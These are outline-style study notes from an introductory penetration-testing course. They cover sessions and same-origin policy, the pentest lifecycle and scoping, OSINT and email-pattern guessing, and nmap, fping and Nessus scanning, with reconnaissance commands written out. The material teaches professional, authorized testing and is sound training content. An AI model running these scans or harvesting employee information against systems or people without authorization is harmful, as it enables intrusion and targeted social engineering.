            - Sometimes the web developer prefers to store some information on the server side instead of the client side; this happens to hide the application logic or just to avoid the back and forth data transmission typical of cookies.
            - Sessions are a mechanism that lets the website store variables specific for a given visit on the server side.
            - Each user session is identified by a session id, or token, which the server assigns to the client.
            - The client then presents this ID for each subsequent request, thus being recognized by the server.
            - By means of the session ID, the server retrieves the state of the client and all its associated variables. The server stores Sessions IDs inside text files in its storage. 
            - Session cookies:
                - Session cookies just contain a single parameter value pair referring to the session.
                - Websites running PHP install session cookies by using the "PHPSESSID" parameter name, while JSP websites use 'JSESSIONID". Each development language has its own default session parameter name.
                - Of course, the web developer can also choose to use a custom parameter name.
                - If needed, servers install session cookies after a browser performs some kind of activity, like:
                    - Opening a specific page
                    - Changing settings in the web application
                    - Logging in 
                - The browser then uses the cookie in subsequent requests. A session could contain many variables, so sending a small cookie keeps the bandwidth usage low.
            - Session IDs can also be transmitted via GET requests.
        - Same Origin Policy
            - Same Origin Policy (SOP) is a critical point of web application security.
            - This policy prevent JavaScript code from getting or setting properties on a resource coming from a different origin.
            - The browser uses:
                - Protocol, Hostname, and Port
            - To determine if JavaScript can access a resource: Hostname, port, and protocol must match.
            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F0IwZqfosuL.png?alt=media&token=e0f4d8ed-696c-469d-965f-52196895ca55)
            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FsrntflxgM-.png?alt=media&token=ac36d417-67d8-4c10-b2aa-9098dfed5fae)
            - The entire web application security is based on Same Origin Policy.
            - If a script on domain A was able to read content on domain B, it would be possible to steal clients' information and mount a number of very dangerous attacks.
        - Burp Suite
            - Intercepting Proxies:
                - An intercepting proxy is a tool that lets you analyze and modify any request, and any response exchange between an HTTP client and a server.
                - By intercepting HTTP messages, a pentester can study a web application behavior and manually test for vulnerabilities.
                - Proxies are fundamental while analyzing web applications and will become your best friend for web-app testing.
                - Do not confuse intercepting proxies with common web proxy servers like Squid. Proxy servers have different purposes: bandwidth optimization, content filtering and more.
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FGTFhSpwRep.png?alt=media&token=0d7c76c3-cc87-4fc4-b90e-fb0b1f164631)
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F-sdf6Hwvcl.png?alt=media&token=bf528751-5d26-4302-9ecd-cede17e3c75c)
            - Burp Proxy:
                - Burp suite will let you:
                    - Intercept requests and responses between your browser and the web server.
                    - Build request manually.
                    - Crawl a website by automatically visiting every page in a website.
                    - Fuzz web applications by sending them patterns of valid and invalid inputs to test their behavior.
                - By using Burp, you can intercept and modify requests coming from your browsers before they are sent to the remote server.
                - You can modify the header and the body of a message by hand or automatically.
            - Burp Proxy Configuration
            - Burp Repeater:
                - Burp Repeater, which lets you manually build raw HTTP requests.
    - 140.Penetration Testing
        - Introduction
            - A penetration tester, much like an experienced hacker, performs a deep investigation of the remote system's security flaws. This activity requires methodology and skills.
            - Penetration testers, unlike hackers, must test for any and all vulnerabilities, not just the ones that may grant them root access to a system. Penetration testing is not about getting root.
            - Furthermore, Penetration Testers cannot destroy their client's infrastructure; professional pentesting requires a thorough understanding of attack vectors and their potential.
        - Lifecycle of a Penetration Test
            - A Penetration Test is both a complex and very delicate process.
            - You have to thoroughly test your client's systems to find any and every vulnerability while, at the same time, you must guarantee that your activity will have the least impact possible on the production systems and services; this is crucial and is the difference between a real professional and an amateur.
            - It is important to carefully select the right tools and techniques to use during your tests to avoid overloading your client systems and networks.
            - Considering the penetration test as a process, rather than an unstructured block of tasks, ensures that every potential vulnerability or security weakness gets tested, with the lowest possible overhead.
            - The success of a task depends on the success of the preceding tasks.
            - Penetration Testing process:
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F7Vgh-1HfzG.png?alt=media&token=3e37a544-5e79-44f0-a12b-ecc38d62cf89)
                - All the details about the penetration test are established during the Engagement phase.
                    - At the Quotation stage, a professional pentester defines the fee for the penetration test of a network, a web application or the whole organization.
                    - The fee will vary according to:
                        - Type of engagement (Black Box, Gray Box, etc.)
                        - How time-consuming the engagement is
                        - The complexity of the applications and services in scope
                        - The number of targets (IP addresses, domains, etc.)
                    - Evaluating and quoting these aspects requires experience that you will gain in the field.
                    - If you are not able to quantify the amount of work required by an engagement, you can provide an hourly fee.
                - Proposal Submittal:
                    - The best way to win a job is by providing a sound and targeted proposal.
                    - You should write the proposal keeping in mind the client's needs and infrastructure.
                    - The proposal should include:
                        - The understanding of the client's needs. In other words, what you understood of their requirements.
                        - The approach and methodology you want to use, like the use of automated scanning tools, manual testing, onsite testing and any other information that fits.
                    - Furthermore, it should also include:
                        - How you want to address their needs and what kind of value the pentest will bring to their business. Think in terms of risks and benefits, like business continuity, improved confidentiality, avoidance of money and reputation loss due to data breaches.
                        - A quotation in terms of price and an estimate of the time required to perform your job.
                    - Finally, any proposal must address:
                        - The type of engagement. Is your activity a penetration test or vulnerability assessment? Is it remote or onsite? And so on.
                        - The scope of engagement in terms of IP addresses, network blocks, domain names or any other information useful in defining the scope.
                - Staying in Scope:
                    - As a professional penetration tester, you should be aware that your client might not have enough knowledge of some IT areas, especially when communicating the target to you.
                    - You should always make sure that the target of your engagement is the property of your client. Be careful especially when asked to perform an engagement (e.g., on a single website)
                    - If it is a part of shared hosting, you must not conduct an assessment on such a target unless you are given written permission from the hosting provider.
                    - Always analyze the target scope and verify if it's your client's property and if you have written permission to conduct the assessment.
                    - You should take any possible out of scope incidents very seriously; in many countries, such unauthorized activity might be considered breaking the law.
                - Incident Handling:
                    - An incident is an unplanned and unwanted situation that affects the client's environment and disrupt its services.
                    - When conduction a penetration test, you should take into consideration that incidents happen.
                    - Even when sticking to all of the best practices and performing every test very carefully, there is always a likelihood of damaging the tested assets, especially when you have little knowledge about the tested environment and cannot predict the result of every single operation.
                    - You should always aim not to damage the target.
                    - In case of planning some intensive or risky tests, you might want to communicate with the customer. For instance, if there are some preferred hours when possible service stoppage will be less painful to them.
                    - It is a best practise to have an incident handling procedure.
                    - Many large organizations already have such processes set up, while the smaller ones might not have implemented such procedures within them.
                    - An incident handling procedure is a set of instructions that need to be executed by both you and your customer on how to proceed when an incident (e.g., service damage or unavailability) occurs.
                    - If there is no fixed procedure established by the client, the simplest way to handle an incident is to have an emergency contact, a technical person on the client's site that is available (via phone or another form of contact) that might coordinate further incident handling for the customer's company.
                - Legal Work:
                    - Once the previous steps are completed, you have to deal with the legal responsibilities of each party involved; this is done by producing some legal paperwork.
                    - Sometimes you will need to involve a lawyer as information security laws vary a lot from country to country. Other times, professional insurance is required, and it is strongly advised to have it as it only costs a few hundred dollars per year and can turn out to be very useful just in case.
                    - Companies usually want you to sign one or more Non-Disclosure Agreements (NDAs). These documents enforce your full confidentiality regarding any information or confidential data you may come across during your engagement.
                    - It does not matter if you have been exposed to private data, information on secret processes or products, it is your duty to keep them private and encrypted on your PC.
                    - With an NDA, a company ensures that you will not divulge any confidential information to any third party. Confidentiality is just one of the legal aspects of pentesting. Another key point is outlining what you can and cannot do.
                    - All of the steps seen thus far apply if you are a Freelance Penetration tester. If you work for an IT Security services company, the legal department will deal with it, and your penetration testing process will start from the next step.
                    - Rules of engagement is another document that will define the scope of engagement and will put on paper what you are entitled to do and when; this includes the time window for your tests and your contacts in the client's organization.
                    - You will want these contacts (client's employees or managers) to coordinate activities, or to promptly communicate with if you accidentally break something during your tests.
                    - Once everything is clearly documented, you can move onto the practical part of the engagement, starting from information gathering.
            - Information Gathering:
                - Information gathering is the first and one of the most fundamental stages of a successful penetration test.
                - Most beginners tend to overlook or rush this phase. If you want to perform an effective pentest; do not do that!
                - Information gathering can start once the legal paperwork is complete but not before the beginning of the testing period. You don't want the client to find anything in their logs before that start date.
                - During this stage, you are an investigator who wants to harvest information about the client's company.
                - General Information:
                    - Such information includes:
                        - Board of directors
                        - Investors
                        - Managers and employees
                        - Branch location and addresses
                        - Names and email addresses of the people above.
                    - The above information is extremely useful if Social Engineering is allowed by the rules of engagement, as you will be able to mount effective targeted attacks.
                - Understanding the Business:
                    - As the goal of a penetration test is to mimic the effects of a black hat hacker attack, you need to understand what are the risks involved and what are the client's critical infrastructures.
                    - Having an understanding of the business is a key aspect in understanding what is important for your client; this allows you to know what is critical and vital for the client, thus allowing you to rate the risks associated with a successful attack.
                - Infrastructure Information Gathering:
                    - After collecting the General Information and you have an Understanding of the Business, the Infrastructure Information Gathering can begin.
                    - In this phase, you transform the IP addresses or the domains in scope into actionable information about servers, operating systems and much more.
                    - If the scope is defined as a list of IP addresses, you can move on to the next step.
                    - If the scope is the whole company or some of their domains, you will have to harvest the relevant IP blocks by using WHOIS and other DNS information.
                    - The goal of this phase is to give meaning to every IP address in scope by determining:
                        - If there is alive host or server using it.
                        - If there are one or more websites using that IP address.
                        - What OS is running on the host or the server.
                    - This will help you:
                        - Focus your efforts to actual live clients and servers.
                        - Target your attacks.
                        - Sharpen your tools for the exploitation phase, when you have to find out the vulnerabilities and exploitability of the client systems. 
                - Web Applications:
                    - If there is any web application in scope, in this phase you will harvest:
                        - Domains
                        - Subdomains
                        - Pages (website crawling)
                        - Technologies in use, like PHP, Java, .NET, and so on.
                        - Frameworks and content management systems in use, like Drupal, Joomla, Wordpress, and others.
                    - You should treat web application as completely separate entities, that require a separate study.
                    - You can gather information about web applications by browsing and inspecting through application proxies such as Burp.
            - Footprinting and Scanning:
                - During the Footprinting and Scanning phase, you deepen your knowledge of the in-scope servers and services.
                - Fingerprinting the OS:
                    - Fingerprinting the Operating System of a host not only gives you information about the OS running on the system, but also helps you narrow down the number of potential vulnerabilities to check in the next phases.
                    - There are tools that can make educated guesses about the OS, the version and even the patch level of a remote system.
                    - Those tools exploit some singularities you can find in the network stack implementation of every operating system.
                - Port Scanning:
                    - After having detected and fingerprinted the live hosts, it's time for port scanning
                    - With a scan of live hosts, you can determine which ports are open on a remote system; this is crucial phase of the engagement because any mistake made here will impact the next steps.
                    - Currently, the in reality port scanner is "nmap".
                - Detecting Services:
                    - Knowing that a port is open is just half of the job.
                    - Next, you will need to know what is the service listening on that port!
                    - In fact, knowing just the port is not enough because, a system administrator can configure a service to listen to any TCP or UDP port.
                    - To detect which service is listening on a port, you can use nmap or other fingerprinting tools.
                    - By knowing the services running on a machine, a penetration tester can infer:
                        - The operating system
                        - The purpose of a particular IP address; for example, if it is a server or a client.
                        - The importance of the host in the client's business. For example, an e-commerce enterprise will heavily rely upon its website and its database server.
                        - After a map of the network infrastructure and the services running on it is built, you can start the vulnerability assessment using vulnerability scan and/or manual inspection.
            - Vulnerability Assessment:
                - The vulnerability assessment phase is aimed at building a list of vulnerabilities present on the target systems.
                - the penetration tester has to carry out a vulnerability assessment on each target found in the previous steps.
                - The next phase, exploitation, will go through this list to exploit the systems.
                - The bigger the list, the more the chances to exploit the systems in scope.
                - You can carry out a vulnerability assessment:
                    - Manually by using data collected in the previous phases.
                    - By utilizing automated tools
                - Vulnerability assessment tools are scanner that send probes to the target systems to detect whether a host has some well-known vulnerabilities.
                - Once the vulnerability scan is complete, the scanner will deliver a report that the pentester can use in the exploitation phase.
                - As automated scanners can perform a huge number of probes, it is extremely important to properly configure them leveraging the information collected in the previous steps.
                - Otherwise, the scanner will blindly perform all its probes, even the ones that do not apply to your targets; this would increase the chances of crashing services and would also take more time than necessary to complete.
                - Most of the time this phase is done by using both automated scanners and manual inspection.
                - Automated tools can help carry out a penetration test, but they will not perform a penetration test on their own.
            - Exploitation:
                - At this point, it's time to verify if the vulnerabilities really exist. The exploitation phase takes care of exploitation all the vulnerabilities found during the previous step.
                - During the exploitation phase a penetration tester checks and validates a vulnerability and also widens and increases the pentester's privileges on the target systems and networks.
                - A successful exploit of a machine helps to investigate the target network further, to discover new targets and to repeat the process from the information phase!
                - A penetration test is indeed a cyclic process.
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FKFFGllG3VN.png?alt=media&token=55b4c967-0d7a-4c95-abe6-f8b2905c0654)
                - The process ends when there are no more systems and services in-scope to exploit.
                - Remember, a penetration test is used to find any and all vulnerabilities.
            - Reporting:
                - Lastly, the final penetration test report is as important as the whole testing phase, as it is your way to officially deliver and communicate the results of your tests with:
                    - Executives
                    - IT Staff
                    - Development team
                - The report shows and explains the result of your tests and is the actual deliverable of your professional engagement.
                - The Report:
                    - The report must address:
                        - Techniques used
                        - Vulnerabilities found
                        - Exploits used
                        - Impact and risk analysis for each vulnerability
                        - Remediation tips
                    - Targeted tips on how to effectively remediate each vulnerability are the real value for the client.
                    - Remember that the work of a penetration tester is much more appreciated if, other than his elite exploitation skills, it provides useful suggestions and techniques the client can use to resolve their security issues.
                - Consultancy:
                    - Penetration testers are often asked to provide some hours of consultancy after delivering the report; this is an additional service to the client should they need further clarification or help regarding your findings.
                    - After the consultancy step, the engagement is closed and the penetration tester must keep the report encrypted in a safe place, or better yet, destroy it.
            - The Secret of an Effective Pentest:
                - Imagine the systems in scope as a target. The bigger the target, the more chances you have to hit it with your darts.
                - Stages like information gathering and fingerprinting do just that; they make your target wider!
                - In technical jargon, this activity is called "widening the attack surface".
                - Using your time at widening the attack surface is much more valuable than shooting darts at an unknown target. You do not know where to shoot, and you do not know which technique is the best to use.
                - On the other hand, a targeted attack has many more chances to succeed! Your main goal as a pentester is to first increase your chances of success and then shoot your darts.
                - Sticking to the process you've just seen is the real secret for an effective pentest.
                - In fact, highly motivated and experienced hackers spend most of their time investigating their victims and gathering information about them using as many sources as possible this helps them launch highly targeted attacks that do not trigger alarms in the victim's defense system.
                - A successful and stealthy attack is made possible by a deep understanding of the target, which comes from a thorough information gathering phase.
- 02.Preliminary Skills - Programming
    - 210.Introduction to Programming
        - What is Programming
            - Programming basically creates a set of instructions that a computer may follow.
            - It can be used to automate tasks, leaving specific things to be done by a machine instead of human.
            - There are various programming and scripting languages that can be used to achieve this. They may have a different syntax and usage requirements, but their purpose is the same - to help humans by automating tasks.
        - Low and High Level Languages
            - Programming languages can be divided into two main groups:
                - Low-level languages
                - High-level languages
            - The level can tell how close they are to the hardware.
            - Low and high-level languages:
                - Low level languages are interpreted directly by the computer. Their advantage is that you can do almost everything in them, while their disadvantage is their complicated nature that can lead to a vulnerability, if the developer doesn't have a deep understanding of the language's capabilities.
                - High level languages offer ease of the development, but they are less flexible. If there are no available libraries that hold certain functionality, writing custom functionality from scratch might be a very difficult task.
                - An example of a low-level language is assembly, which consists of instructions for the processor itself.
                - On a side note, hackers and penetration testers use the assembly language during their (advanced) exploit development activities.
                - Modern processors execute billions of operations per second, so writing a program using processor instructions might not seem to be worthy of any effort. There are only a few modern software types where such a language might be used, for instance, device drivers.
                - On the other hand, high-level languages offer much more development convenience and support broader operations. Lots of single hardware operations are invisibly managed by the language engine.
                - Java, Python, and Visual Basic are example of high-level languages.
                - However, programs created using high-level languages cannot reside on a bare operating system and will need some software already installed on the system to run.
                - If you are about to create code that will operate directly on computer memory, you should use a lower level language.
                - If you are about to create a fancy graphical interface, you should use a higher level language and its graphical libraries that are available.
        - Programming vs Scripting
            - High level programming languages consist of:
                - Programming languages, and
                - Scripting languages
            - Programming languages require a compiler.
            - After writing code in your language of choice, you need to use a special piece of software called a compiler to convert your plain-text program file into something unreadable by a human, but readable by the language environment. You can program in Java or C++ to experience this.
            - On the other hand, scripting languages are usually interpreted, which means that the software environment installed on your computer can read a plain-text program file the same way that you can, and it can execute the instructions without changing the file in any way.
            - Some examples of such scripting language are Visual Basic, and partially, Python.
        - Basic Concepts
            - Each programming language has its own syntax. You can think of it like grammatic rules in human languages.
            - Syntax may require some instructions to use certain characters; for example, ,,;" at the end of the each statement, while in another language this may not be needed.
            - Variables:
                - Programming also uses variables, which are containers that can be names and filled with data.
                - Depending on the programming language, you may also have to choose the correct variable type. Numbers, words, or single characters are usually stored in different variable types.
            - Functions:
                - Programming languages allow users to create and use their own functions.
                - In short, functions are pieces of code responsible for some repeatable tasks.
                - Functions use arguments (as input) and might return (throws out) a value.
            - Conditional statements:
                - Conditional statements means that there is a condition to be checked and that there is at least on instruction defined on how to proceed further.
            - Loops:
                - Loops are also common on every programming language and are set of instructions that need to be executed numerous times. They are often paired with conditional statements in order to check if they should stop, or if they should repeat its instructions again.
            - Understanding the code:
                - When dealing with a new, unknown programming language that you do not understand, you should always start from checking all the aforementioned basic constructs in the language's manual. This will greatly help you understand what the inspected code does.
    - 220.Programming in C++
        - C++ IDE
            - Download C++ IDE @[here](https://sourceforge.net/projects/orwelldevcpp/)
        - refer original slides
    - 230.Programming in Python
        - refer original slides
        - Network Sockets
            - Network sockets are used in computer networks to exchange data (packets) between two endpoints (from a source to a destination)
    - 240.Command Line Scripting
- 03.Penetration Testing
    - Information Gathering
        - Introduction
            - Information Gathering is the first and one of the most crucial phases of an engagement.
            - It helps you understand the target organization, widen the attack surface and mount efficient and targeted attacks.
        - Open-Source Intelligence
            - Nowadays, you can collect information about a company by exploiting information available on social networks, public sites and by visiting the company websites.
            - Social Networks Information Gathering:
                - Many successful security breaches exploit the weakest link in the security chain: human!
                - With the advent of social networks, hackers can now access information on people and products which were very hard to find only a few years ago.
                - Criminals can (and actually do) now exploit this valuable information to mount sophisticated attacks.
                - You, as a professional penetration tester can do the same, by performing queries on common soci 
                - Given the vast array of social networks out there, the right ones for your engagement depends on the specific client and engagement.
                - While LinkedIn, Twitter, and Facebook are good in terms of a "general purpose" shot, you have to choose between other social networks by understanding not only the target company industry but also some of the interests of its employees.
                    - LinkedIn -- personal and work phone numbers, email addresses, different integrated accounts
                    - Twitter
                    - Facebook
                    - Instagram
            - Public Sites Information Gathering:
                - Social networks are not the only public source of information about companies. There are also many other interesting websites and databases that "leak" valuable information.
                - Crunch Base -- detailed information about founders, investors, employees, buyouts, and acquisitions.
                - Government Sites -- companies that have worked with a government or are currently working with one.
            - Whois
                - Another precious resource is the Whois database. You can use it to get information such as:
                    - Owner name
                    - Street addresses
                    - Email Address
                    - Technical contacts
                - regarding an Internet domain name.
                - You can query the database by using the whois command on Linux and OSX.
            - Browsing Client's Sites:
                - Social networks, public sites and the whois services each give you fragmented information that you can put together to better understand your client's business.
                - Finally, don't forget that browsing your client's actual websites will give you plenty of information about:
                    - Products
                    - Services
                    - Technologies
                    - Company culture
            - Discovering Email Pattern:
                - In case there is not a direct database or any other source of company emails, which often also works as logins to corporate services, you might want to try to identify them yourself.
                - Companies tend to use one certain email schema for every employee; this makes internal communication of a company much easier.
                - If you are able to find a company's employees (i.e., using their official website, LinkedIn, or other social networking sites), you might be able to guess their email address.
                - Many mail systems tend to inform the sender that mail was not delivered because it does not exist.
                - This is an excellent opportunity for a penetration tester to guess corporate email formats.
        - Subdomain Enumeration
            - It's common for websites of the same company to share the same top level domain name. For example, career.company.com, mail.company.com or business.company.com
            - Through subdomain enumeration a penetration tester can possibly identify additional resources of a target.
            - Passive subdomain enumeration - means that we will try to identify subdomains without directly interacting with the target, but through open sources.
            - You can try this by typing the following in Google's search engine `site: company.com`
            - Another open source that can facilitate passive subdomain enumeration is "dnsdumpster.com", that utilizes data from google-indexed subdomains, but also checks sites like Bing or virustotal for similar information.
            - There is also a tool that extends the capabilities of DNS enumeration, called sublist3r
                - In its basic usage, sublist3r will collect DNS data from various sources.
            - The aforementioned subdomain enumeration techniques will help you identify publicly available target assets. Each one of them may be vulnerable to attacks, which should be thouroughly checked during the penetration test. 
        - The Importance of Information Gathering
            - A strong phase of Information Gathering makes the difference between a good and a bad penetration tester.
            - A good penetration tester spends 90% of his time widening the attack surface because he knows this is what it is all about. The other 10% is just a matter of launching the correct commands with the appropriate tool with a high success rate.
            - Your penetration test will be as strong as your weakest skill, so do not underestimate information gathering!
    - Footprinting and Scanning
        - Mapping a Network
            - Ping Sweeping:
                - Ping works by sending one or more special ICMP packets to a host. If the destination host replies with ICMP echo reply packets, then the host is alive.
                - Ping sweeping tools automatically perform the same operation to every host in a subnet or IP range, saving you from typing hundreds or thousands ping of commands.
                - fping is a Linux tool which is an improvides version of the standard ping utility. You can use Fping to perform ping sweeps: installed by default on Kali Linux.
                    - `-a` option forces the tool to show only alive hosts
                    - `-g` option tells the tool that we want to perform a ping sweep instead of a standard ping.
                    - Command would like -- `fping -a -g 10.54.12.0/24` 
                    - When running Fping on a LAN you are directly attached to, even if you use the -a option, you will get some warning messages (ICMP Host Unreachable) about offline hosts.
                    - To suppress those messages, you can redirect the process standard error to `/dev/null`.
                        - `fping -a -g 192.168.82.0 192.168.82.255 2>/dev/null`
                - Nmap Ping Scan:
                    - Nmap (Network Mapper) is an open source tool for network exploration and security auditing. Installed on Kali by default.
                    - You can perform a ping scan by using the `-sn` command line switch. You can specify your targets on the command line in CIDR format as a range and by using wildcard notation.
                    - `# nmap –sn 200.200.0.0/16 
# nmap –sn 200.200.123.1-12 
# nmap –sn 172.16.12.* 
# nmap –sn 200.200.12-13.*`
                    - Moreover, you can save your host list in a file and use the input list `-iL` command line switch -- `nmap -sn -iL hostslist.txt`
                    -  ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F7RdKIul6eX.png?alt=media&token=3ba702b7-6a24-4438-a8d3-3b6d928b7497)
            - OS Fingerprinting:
                - Fingerprinting tools send a series of specially crafted requests to the target host.
                - They then examine every bit in the response, creating a signature of the host behavior.
                - Finally, the signature is compared against a database of known operating systems signatures.
                - During a penetration test, you will have to perform this reconnaissance step on every network node, including:
                    - Routers
                    - Firewalls
                    - Hosts
                    - Servers
                    - Printers
                    - And so on...
                - The goal of this phase is to write a table like the following:
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FLXGvnVaOkB.png?alt=media&token=a23a324c-29b2-41f0-ae1c-1b270fda631c)![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FEvLj4kICxo.png?alt=media&token=d972698e-ddab-43bc-9bf6-7094f7d1838c)
                - To perform OS fingerprinting with nmap, you ahve to use `-O` command line option and specify your target(s).
                - You can also add the `-Pn` switch to skip the ping scan if you already know that the targets are alive.
            - Port Scanning:
                - Once network mapping is performed, we know which nodes and associated operating systems, are active on the target network. 
                - We now need a way to discover the daemons and services running on those nodes: port scanning!
                - Port scanning is a process used to determine what TCP and UDP ports are open on target hosts. Moreover, it lets you known which daemon, in terms of software and version, is listening on a specific port.
                - A daemon is a piece of software running on a server to provide a given service. A daemon also listen on a specific port.
                - The ultimate goal of port scanning/service detection is to find the software name and version of the daemons running on each host.
                - Under the Hood of a Port Scanner:
                    - Port scanning utilities, or port scanners, automate probes request and response analysis. These are powerful tools that not only give you information about the targets but also let you detect if there is a firewall between you and the target.
                    - TCP Connect scan:
                        - The simplest way to perform a port scan is trying to connect to every port.
                            - If the scanner receives a RST packet, then the port is closed.
                            - If the scanner can complete the 3-way handshake, then the port is open. After connecting, the scanner sends an RST packet to the target host to abruptly close the connection.
                            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FUQodd_SNL0.png?alt=media&token=49ea9a2e-f903-41de-b7a2-fe0ba030256a)
                            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FeVkuPkkY3F.png?alt=media&token=2fb52cc2-3dfd-42ef-ae18-aa151157f5a1)
                        - Every TCP connect scan probe gets recorded in the daemon logs because, from the application point of view, the probe looks like a legitimate connection.
                        - System administrators can easily detect the scan as they will see a lot of connections to all the services running on a single machine; to prevent that, TCP SYN scans were invented.
                    - TCP SYN Scan:
                        - TCP SYN scans were invented to be stealthy by design
                        - During a SYN scan, the scanner does not perform a full handshake it just sends a SYN packet and analyzes the response coming from the target machine.
                        - The scanner sends a TCP packet with the SYN flag enabled to the destination <host>:<port> pair and:
                            - If it receives a RST packet, then it marks the port as closed.
                            - If the scanner receives an ACK packet, then the port is open. After marking the port as open, the scanner sends an RST packet to the target host to stop the handshake.
                        - As there is no real connection to the destination daemon, a SYN scan cannot be detected by looking at daemons logs. 
                - Scanning with Nmap:
                    - Nmap syntax is very simple, yet powerful:
                    - `nmap [Scan Type(s)] [Options] {target specification}`
                    - Nmap Scan Types:
                        - The most used scan types are:
                            - -sT performs a TCP connect scan
                            - -sS performs a SYN scan
                            - -sV performs a version detection scan
                        - TCP connect scan with nmap -- `nmap -sT <target>`
                        - TCP SYN scan with nmap -- `nmap -sS <target>`
                        - Version scan with nmap -- `nmap -sV <target>`
                            - During a version detection scan, Nmap performs a TCP connect scan and reads from the server the banner of the daemon listening on a port.
                            - If the daemon does not send a banner by itself, Nmap sends some probes to understand what the listening application is. The idea behind this is to guess the application and its version by studying its behavior.
                    - Specifying the Targets:
                        - Nmap has a very flexible syntax to specify your targets. You can use DNS names, IP address lists, CIDR notation, wildcards, ranges, octets lists, and even input files.
                        - By DNS Name:
                            - Specifying targets by their DNS names is just a matter of writing them on the command line. `nmap <scan type> target1.domain.com target2.otherdomain.com`
                        - With an IP addresses list:
                            - You can write a list of IP addresses on the command line -- `nmap <scan type> 192.168.1.45 200.200.14.56`
                        - By using CIDR Notation:
                            - You could also use the CIDR notation if you have to scan one or more networks -- `nmap <scan type> 192.168.1.0/24 10.0.0.0/8`
                        - By using wildcards:
                            - Using wildcards where an asterisk * is converted to the 0-255 range -- `nmap <scan type> 192.168.1.*`
                        - Specifying Ranges:
                            - You can specify an interval for every octet. For example, if you want to scan just a part of a /16 network you could use: `nmap <scan type> 200.200.6-12.*`
                    - Choosing the Ports to Scan:
                        - When you specify one or more targets, by default, Nmap scans the most common ports used on the Internet.
                        - If you want to specify custom ports, you can use the "-p" option.
                        - You can specify your ports as a comma-separated list, or as a port interval.
                        - `nmap -p 21,22 <target>`
                        - `nmap -p 100-1000 <target>`
                    - Discovering Network with Port Scanning:
                        - In your penetration testing career, you might encounter networks that are protected by firewalls and where pings are blocked.
                        - For such cases, you should be armed with at least one backup plan.
                        - It's not uncommon to come across a server that does not respond to pings but has many TCP or UDP ports open.
                        - When using nmap, you can use the "-Pn" switch to force the scan on such a server. (skip ping scanning and treat it as alive)
                        - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2Ff1j3NULtOS.png?alt=media&token=f3f7c5db-caac-49b0-904f-9fc71588ae22)
                    - Spotting the firewall:
                        - First, you pay attention to incomplete nmap results. On an open network, if a TCP scan succeeded against a well-known service, like a web server, nmap should not have any difficulty in trying to fingerprint it with -sV switch.
                        - **tcpwrapped** means that the TCP handshake was completed, but the remote host close the connection without receiving any data.
                        - This is an indication that something is blocking connectivity with the target host.
                        - Moreover, you might want to use the nmap **--reason** switch that will show an explanation of why a port is marked open or closed.
                    - Masscan:
                        - Masscan was designed to deal with large networks and to scan thousands of IP addresses at once.
                        - It's like nmap, but a lot faster; however, it might be a bit less accurate. It's up to you which one you will use on a penetration testing assessment.
                        - You could perform host discovery using masscan, and then conduct a detailed scan with nmap against certain interesting hosts.
    - Vulnerability Assessment
        - Vulnerability assessment is a scan of the vulnerabilities found on networks and applications, it is also faster and has a lighter load on the infrastructure.
        - We can say that the vulnerability assessment is more of a linear process as opposed to a penetration test which is more in depth, both in terms of vulnerabilities discovered and vulnerabilities tested.
        - Vulnerability Scanners:
            - A vulnerability assessment, in the same manner as a penetration test, can be carried out both locally and remotely.
            - Checking one or more systems for all the known vulnerabilities would be infeasible so that penetration testers can use a vulnerability scanner.
            - Scanners use a database of known vulnerabilities and security audits to detect the vulnerabilities of a system. scanners perform their probes on:
                - Daemons listening on TCP and UDP ports.
                - Configuration files of operating systems, software suites, network devices, etc.
                - Windows registry entries.
            - The purpose is to find vulnerabilities and mis-configurations. 
            - The scanner's vendor keeps the tool up to date and constantly updates its database with new security checks and vulnerabilities signatures.
            - The more the database is up to date, the better and more relevant the scan results will be.
            - There are a lot of vulnerability scanners out there, like OpenVAS, Nexpose or GFI LAN Guard.
            - Nessus is one of the most popular vulnerability scanners.
        - Manual Testing:
            - If you have to test a custom application, a vulnerability scanner may not be enough; you have to test it manually!
            - Testing a custom application is very similar to testing a web application.
            - Studying custom applications means:
                - Learning and understanding its features
                - Understanding how it exchanges data over the network
                - Understanding how it accesses resources like databases, servers, local and remote files and so on
                - Reverse engineering its logic
        - Nessus
            - Nessus is an easy to use yet powerful vulnerability scanner that works great both on a small and a large company network.
            - It has a free license for non-commercial use.
            - Architecture:
                - Nessus has two components: a client and a server. You will use the client to configure the scans and the server to actually perform the scanning processes and report the results back to the client.
                - The client component provides you with a web interface to configure your scans.
                - The server component performs the scans by sending probes to systems and applications, collecting the responses and matching them against its vulnerability database.
                - You can run both components on the same machine; this is a simple yet effective configuration for a home network or a lab environment.
            - Under the Hood of a Vulnerability Scanner:
                - Every vulnerability scanner roughly performs the same steps during a scan.
                - Port Scanning:
                    - The first step is determining if the target hosts are alive and which ports are open on them; to do that the vulnerability scanner performs a port scan to test the open ports on the systems. The more accurate the port scan is, the more useful results the vulnerability scanner will get.
                - Service Detection:
                    - For every open port found, the vulnerability scanner will send special probes to determine which application (name and version) is running on them.
                - Vulnerabilities Database Lookup:
                    - For each detected service (also known as a daemon), the scanner queries its database looking for known vulnerabilities.
                    - When configuring the scanner, you can configure which vulnerabilities you want to check for.
                - Probing:
                    - During the last step, the scanner sends probes to verify if the vulnerability actually exists.
                    - This phase is prone to false positives as some probes could be too mild to effectively identify a real vulnerability.
